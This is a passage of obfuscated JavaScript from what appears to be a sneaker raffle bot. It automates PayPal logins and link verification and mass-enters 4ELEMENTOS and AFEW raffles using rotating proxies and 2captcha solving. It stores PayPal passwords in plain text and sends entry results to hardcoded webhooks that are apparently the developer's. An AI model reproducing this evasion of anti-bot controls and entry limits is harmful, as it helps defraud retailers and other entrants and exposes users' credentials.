        var _0x51e9a2 = Math['round'](Math['random']() * (_0x305e37['length'] - 0x1));
        _0x2d3472['Proxy'] = _0x305e37[_0x51e9a2], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x2bdd03 = await _0x3432fc['get']('Password');
        return _0x2d3472['Password'] = _0x2bdd03['Password'], _0xa4bb3a['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x2d3472['Email'] + ',' + _0x2d3472['Password'] + ',' + _0x2d3472['Proxy']), _0x2d3472;
    }
    let _0xcaf875 = await _0x167a6c();
    var _0x417089 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x462001 = await _0x3432fc['get']('Amount'), _0x2c0b02 = _0x462001['Amount'];
    async function _0xf9b839() {
        let _0x2ac8a9 = 0x0;
        var _0x3e780d = new _0x2e8fd8({
            'user': _0x30cea3['masterMail'],
            'password': _0x30cea3['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x323595(_0x222f49) {
            _0x3e780d['openBox']('INBOX', ![], _0x222f49);
        }
        _0x3e780d['once']('ready', function () {
            _0x323595(function (_0x13251e, _0x197492) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x13251e)
                    throw _0x13251e;
                _0x3e780d['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x414eb8, _0x418dcd) {
                    if (!_0x418dcd || !_0x418dcd['length'])
                        console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20No\x20mails\x20found'), _0x3e780d['end']();
                    else {
                        _0x418dcd = _0x418dcd['slice'](0x0, _0x2c0b02);
                        var _0x14b495 = _0x3e780d['seq']['fetch'](_0x418dcd, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x14b495['on']('message', function (_0x451eb2, _0x5c0634) {
                            var _0x3e9224 = '(#' + _0x5c0634 + ')\x20';
                            _0x451eb2['on']('body', function (_0x283dda, _0x17d5c1) {
                                _0x2f2a1d(_0x283dda, (_0x17d561, _0x5660fb) => {
                                    if (_0x5660fb['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x5660fb['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x5660fb['text']['split']('[')[0x2];
                                        var _0x4b3b76 = mes['split'](']')[0x0];
                                        _0x417089['push'](_0x4b3b76);
                                    }
                                });
                            }), _0x451eb2['once']('end', function () {
                                _0x2ac8a9++;
                            });
                        }), _0x14b495['once']('error', function (_0x53da09) {
                            console['log']('Fetch\x20error:\x20' + _0x53da09);
                        }), _0x14b495['once']('end', function () {
                            _0x3e780d['end']();
                        });
                    }
                });
            });
        }), _0x3e780d['once']('error', function (_0xf438e6) {
            console['log'](_0x10a2e3['red'](_0xf438e6['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x3e780d['once']('end', async function () {
        }), _0x3e780d['connect']();
    }
    try {
        _0xf9b839(), await _0x2be9fc(0xfa0), console['log']('Found\x20' + _0x417089['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2be9fc(0xfa0);
    }
    var _0x480a32;
    _0x1a7b1b('' + _0x32bb28);
    var _0x371095 = _0xcaf875['Proxy']['split'](':'), _0x312884;
    try {
        _0x312884 = await _0x3d8cc4['launch']({
            'userDataDir': 'sessions/' + _0xcaf875['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x371095[0x0] + ':' + _0x371095[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x312884 = await _0x3d8cc4['launch']({
            'userDataDir': 'sessions/' + _0xcaf875['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x371095[0x0] + ':' + _0x371095[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Getting\x20Session');
        const _0x3b73c1 = await _0x312884['newPage']();
        await _0x3b73c1['authenticate']({
            'username': '' + _0x371095[0x2],
            'password': '' + _0x371095[0x3]
        }), await _0x3b73c1['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3b73c1['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3b73c1['waitForSelector']('#email');
            let _0x4a5d0d = await _0x3b73c1['$eval']('#email', _0x222d06 => _0x222d06['getAttribute']('value'));
            if (_0x4a5d0d == '') {
                await _0x3b73c1['type']('#email', _0xcaf875['Email']), await _0x2be9fc(0x1d3);
                let _0x1735cc = await _0x3b73c1['$']('#splitPassword');
                _0x1735cc && (await _0x3b73c1['click']('#btnNext'), await _0x2be9fc(0xa28)), await _0x3b73c1['type']('#password', _0xcaf875['Password']), await _0x2be9fc(0x35c), await _0x3b73c1['click']('#btnLogin');
            } else
                await _0x3b73c1['type']('#password', _0xcaf875['Password']), await _0x2be9fc(0x35c), await _0x3b73c1['click']('#btnLogin');
            await _0x3b73c1['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Successfully\x20logged\x20in'), await _0x2be9fc(0x2710);
        } catch (_0x6577a8) {
            throw new Error('Login\x20session\x20expired\x20' + _0x6577a8);
        }
        for (var _0x357718 = 0x0; _0x357718 < _0x417089['length']; _0x357718++) {
            console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Task\x20' + (_0x357718 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1a7b1b(_0x32bb28 + '\x20Task\x20' + (_0x357718 + 0x1) + '\x20/\x20' + _0x417089['length']);
            const _0x1b69eb = await _0x312884['newPage']();
            await _0x1b69eb['goto']('' + _0x417089[_0x357718], { 'waitUntil': 'networkidle2' }), await _0x2be9fc(0xbb8);
            try {
                const _0x4ebf1b = await _0x1b69eb['$']('#challenge-heading');
                _0x4ebf1b && (console['log'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Task\x20' + (_0x357718 + 0x1) + '\x20:\x20' + _0x10a2e3['yellow']('2FA\x20Required')), await _0x1b69eb['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x2be9fc(0x9c40), await _0x1b69eb['waitForSelector']('#payment-submit-btn'), await _0x1b69eb['$eval']('#payment-submit-btn', _0x319553 => _0x319553['click']()), await _0x1b69eb['click']('#payment-submit-btn');
                try {
                    await _0x1b69eb['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x2be9fc(0x5dc), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Task\x20' + (_0x357718 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x307879) {
                    _0x476484 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x307879['message']);
                } finally {
                    if (_0x476484 == 'yes' && _0x465afe != 0x2) {
                        console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x32bb28['name'] + ']\x20Task\x20' + (_0x357718 + 0x1) + '\x20:\x20Retrying\x20(' + _0x465afe + '\x20/\x205)')), _0x357718 = _0x357718 - 0x1, _0x465afe = _0x465afe + 0x1;
                        continue;
                    }
                    _0x476484 == 'yes' && _0x465afe >= 0x2 && (_0x48f0c7(csv[_0x357718], _0x32bb28), _0x476484 = 'no', _0x465afe = 0x0), await _0x1b69eb['close'](), await _0x2be9fc(0x4650);
                }
            } catch (_0x5a5427) {
                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x32bb28 + ']\x20Task\x20' + (_0x357718 + 0x1) + '\x20:\x20' + _0x5a5427));
            }
        }
    } catch (_0xc0abcb) {
        console['log'](_0x10a2e3['red']('' + _0xc0abcb));
    } finally {
        await _0x312884['close']();
    }
}
const _0xae095a = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x48c638, _0x297a61, _0x229eef) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2349c9 = 0x0; _0x2349c9 < _0x297a61['length']; _0x2349c9++) {
                        if (_0x4a0862 != 'yes')
                            var _0x4a0862 = '', _0x297bd2 = 0x0;
                        var _0x488ada;
                        try {
                            await _0x319293(_0x297a61, _0x2349c9);
                        } catch {
                            _0x4a0862 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1a7b1b(_0x48c638['name'] + '\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20/\x20' + _0x297a61['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        var _0x408258 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4ccadf = Math['round'](Math['random']() * (_0x408258['length'] - 0x1));
                        _0x297a61[_0x2349c9]['Size'] == 'RANDOM' && (_0x297a61[_0x2349c9]['Size'] = _0x408258[_0x4ccadf]);
                        var _0x40b6be = Math['round'](Math['random']() * (_0x229eef['length'] - 0x1)), _0x31c4ab = _0x229eef[_0x40b6be]['split'](':'), _0x4eecb7;
                        try {
                            _0x4eecb7 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31c4ab[0x0] + ':' + _0x31c4ab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4eecb7 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31c4ab[0x0] + ':' + _0x31c4ab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x4a95c3 = await _0x4eecb7['newPage']();
                            await _0x4a95c3['authenticate']({
                                'username': '' + _0x31c4ab[0x2],
                                'password': '' + _0x31c4ab[0x3]
                            }), await _0x4a95c3['setRequestInterception'](!![]), _0x4a95c3['on']('request', _0x1f4214 => {
                                _0x1f4214['resourceType']() === 'image' || _0x1f4214['resourceType']() === 'font' || _0x1f4214['resourceType']() === 'media' ? _0x1f4214['abort']() : _0x1f4214['continue']();
                            }), await _0x4a95c3['goto'](_0x297a61[_0x2349c9]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x4a95c3['waitForSelector']('#accept-all-gdpr'), await _0x4a95c3['click']('#accept-all-gdpr'), await _0x4a95c3['waitForSelector']('#raffles-product'), await _0x2be9fc(0x3e8), await _0x4a95c3['$eval']('#raffles-product', _0xf070ff => _0xf070ff['click']()), await _0x2be9fc(0x1388), await _0x4a95c3['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2e95d4 = await _0x4a95c3['$']('.fancybox-inner\x20>\x20iframe'), _0x368b4a = await _0x2e95d4['contentFrame']();
                            console['log'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x368b4a['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x2be9fc(0x1f4), await _0x368b4a['type']('input[name=\x22sm-form-email\x22]', _0x297a61[_0x2349c9]['Email']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-name\x22]', _0x297a61[_0x2349c9]['FirstName'] + '\x20' + _0x297a61[_0x2349c9]['LastName']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-street\x22]', _0x297a61[_0x2349c9]['Address1'] + '\x20' + _0x297a61[_0x2349c9]['HouseNumber'] + '\x20' + _0x297a61[_0x2349c9]['Address2']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-city\x22]', _0x297a61[_0x2349c9]['City']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-province\x22]', _0x297a61[_0x2349c9]['State']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-zip\x22]', _0x297a61[_0x2349c9]['Zip']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-country\x22]', _0x297a61[_0x2349c9]['Country']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-form-phone\x22]', _0x297a61[_0x2349c9]['Phone']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x297a61[_0x2349c9]['Follower']), await _0x2be9fc(0xc8), await _0x368b4a['type']('input[name=\x22sm-cst.size\x22]', _0x297a61[_0x2349c9]['Size']), await _0x2be9fc(0x1f4), await _0x368b4a['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x2be9fc(0x1f4), await _0x368b4a['click']('.icheckbox_simple-custom'), await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x368b4a['$eval']('form', _0xf88c53 => _0xf88c53['submit']()), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x4a0862 = '';
                            var _0x223a5c = await _0x14203e(_0x297a61[_0x2349c9], _0x48c638, 'dev', ![]), _0x102532 = await _0x14203e(_0x297a61[_0x2349c9], _0x48c638, 'pub', ![]);
                            const _0x5381f4 = {
                                'succesDEVMSG': { 'embeds': [_0x223a5c] },
                                'succesPUBMSG': { 'embeds': [_0x102532] }
                            };
                            try {
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x5381f4['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x5381f4['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x5381f4['succesPUBMSG']);
                            } catch (_0x6a5186) {
                                console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x6a5186));
                            }
                        } catch (_0x47761f) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20' + _0x47761f)), _0x488ada = '' + _0x47761f;
                            var _0xf5429b = await _0x14203e(_0x297a61[_0x2349c9], _0x48c638, 'dev', !![], _0x488ada), _0x223a5c = await _0x14203e(_0x297a61[_0x2349c9], _0x48c638, 'dev', ![]), _0x102532 = await _0x14203e(_0x297a61[_0x2349c9], _0x48c638, 'pub', ![]);
                            const _0x13cbab = {
                                'succesDEVMSG': { 'embeds': [_0x223a5c] },
                                'succesPUBMSG': { 'embeds': [_0x102532] }
                            };
                            _0x13cbab['errorDEV'] = { 'embeds': [_0xf5429b] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x13cbab['errorDEV']), await _0x1bfffd(_0x31e47f, _0x13cbab['errorDEV']), _0x47761f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4a0862 = 'yes');
                        } finally {
                            _0x4eecb7['close']();
                            if (_0x4a0862 == 'yes' && _0x297bd2 != 0x5 && _0x488ada != 'Size\x20Not\x20Found') {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Task\x20' + (_0x2349c9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x297bd2 + '\x20/\x205)\x20')), _0x2349c9 = _0x2349c9 - 0x1, _0x297bd2 = _0x297bd2 + 0x1;
                                continue;
                            }
                            _0x4a0862 == 'yes' && _0x297bd2 >= 0x5 && (_0x48f0c7(_0x297a61[_0x2349c9], _0x48c638), _0x4a0862 = 'no', _0x297bd2 = 0x0), console['log'](_0x451967() + '\x20[' + _0x48c638['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x565da0, _0x303383) {
                    var _0x2c9725 = [];
                    async function _0x3f51a4() {
                        var _0x2bd806 = new _0x2e8fd8({
                            'user': _0x30cea3['masterMail'],
                            'password': _0x30cea3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2e3855(_0x478c7d) {
                            _0x2bd806['openBox']('INBOX', ![], _0x478c7d);
                        }
                        _0x2bd806['once']('ready', function () {
                            _0x2e3855(function (_0x2b6ec6, _0x12832b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2b6ec6)
                                    throw _0x2b6ec6;
                                _0x2bd806['seq']['search'](['UNSEEN'], function (_0x43bbec, _0x3e1e61) {
                                    if (!_0x3e1e61 || !_0x3e1e61['length'])
                                        console['log'](_0x451967() + '\x20[' + _0x565da0['name'] + ']\x20No\x20mails\x20found'), _0x2bd806['end']();
                                    else {
                                        var _0xc68459 = _0x2bd806['seq']['fetch'](_0x3e1e61, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xc68459['on']('message', function (_0x5d6958, _0x39ca6c) {
                                            var _0x29d9c9 = '(#' + _0x39ca6c + ')\x20';
                                            _0x5d6958['on']('body', function (_0x2fffbe, _0x15dde4) {
                                                _0x2f2a1d(_0x2fffbe, (_0xc5916d, _0x157fb7) => {
                                                    if (_0x157fb7['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x21a24e = _0x157fb7['html']['split']('\x0a');
                                                        for (var _0x4de10f = 0x0; _0x4de10f < _0x21a24e['length']; _0x4de10f++) {
                                                            if (_0x21a24e[_0x4de10f]['includes']('salesmanago') && _0x21a24e[_0x4de10f]['includes']('<td') && _0x21a24e[_0x4de10f]['includes']('href')) {
                                                                var _0x2c6d2f = _0x21a24e[_0x4de10f]['split']('href=\x22'), _0x32b3c6 = _0x2c6d2f[0x1]['split']('\x22')[0x0];
                                                                _0x2c9725['push'](_0x32b3c6);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x5d6958['once']('end', function () {
                                            });
                                        }), _0xc68459['once']('error', function (_0x3beb28) {
                                            console['log']('Fetch\x20error:\x20' + _0x3beb28);
                                        }), _0xc68459['once']('end', function () {
                                            _0x2bd806['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2bd806['once']('error', function (_0x48a5b4) {
                            console['log'](_0x10a2e3['red'](_0x48a5b4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x2bd806['once']('end', async function () {
                        }), _0x2bd806['connect']();
                    }
                    async function _0x5e4fc9(_0x29148a, _0x13a2ea, _0xf655b6) {
                        for (var _0x51abc9 = 0x0; _0x51abc9 < _0x13a2ea['length']; _0x51abc9++) {
                            async function _0x1fc4c6(_0x16b2bf, _0x23d51a, _0x2f07f7, _0x59bc25, _0x5b1e95) {
                                var _0x40e5a2, _0x2e4ee7 = {}, _0x19c7f6 = [], _0x5e7ea8 = {}, _0xdf5d1c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x19a1f0 = Math['round'](Math['random']() * (_0xdf5d1c['length'] - 0x1));
                                _0x59bc25[_0x16b2bf]['Size'] == 'RANDOM' && (_0x59bc25[_0x16b2bf]['Size'] = _0xdf5d1c[_0x19a1f0]);
                                !_0x59bc25 && (_0x59bc25 = {});
                                if (_0x30cea3['useRandomProxy'] = ![])
                                    var _0x1f10f0 = _0x5b1e95[_0x16b2bf]['split'](':');
                                else
                                    var _0x2560c4 = Math['round'](Math['random']() * (_0x5b1e95['length'] - 0x1)), _0x1f10f0 = _0x5b1e95[_0x2560c4]['split'](':');
                                var _0x167110 = {
                                    'jar': _0x4a6742,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2f07f7['url'],
                                    'headers': _0x2f07f7['headers'],
                                    'body': JSON['stringify'](_0x2e4ee7),
                                    'proxy': 'http://' + _0x1f10f0[0x2] + ':' + _0x1f10f0[0x3] + '@' + _0x1f10f0[0x0] + ':' + _0x1f10f0[0x1]
                                };
                                return _0x23d51a != 'ver' && (_0x167110['url'] = _0x2f07f7['url'], _0x167110['headers'] = _0x2f07f7['headers']), _0x23d51a == 'ver' && (_0x167110['method'] = 'GET', _0x167110['url'] = _0x59bc25[_0x16b2bf]), new Promise(function (_0x552288, _0x48b38b) {
                                    callback = async (_0x3c745e, _0xbc1cd9, _0x1e01f1) => {
                                        if (!_0x3c745e && _0xbc1cd9['statusCode'] == 0xca || !_0x3c745e && _0xbc1cd9['statusCode'] == 0xc8) {
                                            if (_0x23d51a != 'ver') {
                                                var _0x46fbe8 = await _0x14203e(_0x59bc25[_0x16b2bf], _0x2f07f7, 'dev', ![]), _0x541f78 = await _0x14203e(_0x59bc25[_0x16b2bf], _0x2f07f7, 'pub', ![]);
                                                const _0x2fabb4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x46fbe8] },
                                                    'succesPUBMSG': { 'embeds': [_0x541f78] }
                                                };
                                                if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                                    try {
                                                        await _0x1bfffd(_0x30cea3['webhook'], _0x2fabb4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x2fabb4['succesDEVMSG']), await _0x2be9fc(0xc8);
                                                try {
                                                    await _0x1bfffd(_0x3b111f, _0x2fabb4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x34c52d(_0x59bc25[_0x16b2bf], _0x2f07f7);
                                            }
                                            _0x552288(console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x2f07f7['name'] + ']\x20Task\x20' + (_0x16b2bf + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x23d51a != 'ver') {
                                                var _0x2fd01c = '' + _0x3c745e, _0x5895f6 = await _0x14203e(_0x59bc25[_0x16b2bf], _0x2f07f7, 'dev', !![], _0x2fd01c), _0x51e292 = {};
                                                _0x51e292['errorDEV'] = { 'embeds': [_0x5895f6] }, _0x48f0c7(_0x59bc25[_0x16b2bf], _0x2f07f7), _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x51e292['errorDEV']), await _0x1bfffd(_0x31e47f, _0x51e292['errorDEV']);
                                            }
                                            _0x48b38b(console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x2f07f7['name'] + ']\x20Task\x20' + (_0x16b2bf + 0x1) + ':\x20' + _0x3c745e)));
                                        }
                                    };
                                    try {
                                        _0x23d51a != 'ver' ? console['log'](_0x451967() + '\x20[' + _0x2f07f7['name'] + ']\x20Task\x20' + (_0x16b2bf + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2e4ee7['data']['attributes']['email']) : console['log'](_0x451967() + '\x20[' + _0x2f07f7['name'] + ']\x20Task\x20' + (_0x16b2bf + 0x1) + ':\x20Fetching\x20Response'), _0x17f04c(_0x167110, callback);
                                    } catch (_0xf83f6b) {
                                        console['log'](_0x451967() + '\x20Task\x20' + (_0x16b2bf + 0x1) + ':\x20' + _0xf83f6b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1fc4c6(_0x51abc9, 'ver', _0x29148a, _0x13a2ea, _0xf655b6), console['log'](_0x451967() + '\x20[' + _0x29148a['name'] + ']\x20Sleeping\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            } catch (_0x362610) {
                            }
                        }
                    }
                    try {
                        _0x3f51a4(), await _0x2be9fc(0xfa0), console['log']('Found\x20' + _0x2c9725['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5e4fc9(_0x565da0, _0x2c9725, _0x303383);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x306ca2, _0xa8f24d, _0x1603b9) {
                for (var _0x839c94 = 0x0; _0x839c94 < _0xa8f24d['length']; _0x839c94++) {
                    _0x30cea3['AfewDelay'] = _0x30cea3['delay'];
                    var _0x325be2;
                    if (_0xb0c027 != 'yes')
                        var _0xb0c027 = '', _0x3d8bb6 = 0x0;
                    var _0x2042ef = _0xa8f24d[_0x839c94]['Url'], _0x1d06a9 = _0xa8f24d[_0x839c94];
                    _0x1a7b1b(_0x306ca2['name'] + '\x20Task\x20' + (_0x839c94 + 0x1) + '\x20/\x20' + _0xa8f24d['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                    try {
                        await _0x319293(_0xa8f24d, _0x839c94);
                    } catch {
                        _0xb0c027 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4c70a2(_0x36a1ce) {
                        const _0x27e48b = _0xa4bb3a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x928e23 = _0x5b1b10['parse'](_0x27e48b, { 'header': !![] })['data'];
                        let _0xaf8159 = ![];
                        for (var _0x26ebeb of _0x928e23) {
                            if (_0x26ebeb['Url'] == _0x36a1ce['Url'] && _0x26ebeb['Email'] == _0x36a1ce['Email']) {
                                _0xaf8159 = !![];
                                break;
                            }
                        }
                        return _0xaf8159;
                    }
                    if (await _0x4c70a2(_0xa8f24d[_0x839c94]) == !![]) {
                        console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xb4d844 = await _0x14203e(_0xa8f24d[_0x839c94], _0x306ca2, 'dev', ![]), _0x33ab50 = await _0x14203e(_0xa8f24d[_0x839c94], _0x306ca2, 'pub', ![]);
                    const _0x4880b4 = {
                        'succesDEVMSG': { 'embeds': [_0xb4d844] },
                        'succesPUBMSG': { 'embeds': [_0x33ab50] }
                    };
                    if (_0xa8f24d[_0x839c94]['Email'] == '' || _0xa8f24d[_0x839c94]['FirstName'] == '' || _0xa8f24d[_0x839c94]['LastName'] == '' || _0xa8f24d[_0x839c94]['Country'] == '' || _0xa8f24d[_0x839c94]['Size'] == '' || _0xa8f24d[_0x839c94]['Address1'] == '' || _0xa8f24d[_0x839c94]['Zip'] == '') {
                        console['log'](_0x451967() + '\x20[' + _0x306ca2['name'] + ']\x20Task\x20' + (_0x839c94 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x30cea3['useRandomProxy'] = ![])
                        var _0x48edf0 = _0x1603b9[_0x839c94]['split'](':');
                    else
                        var _0x560fbd = Math['round'](Math['random']() * (_0x1603b9['length'] - 0x1)), _0x48edf0 = _0x1603b9[_0x560fbd]['split'](':');
                    var _0x310fc5;
                    try {
                        _0x310fc5 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x48edf0[0x0] + ':' + _0x48edf0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
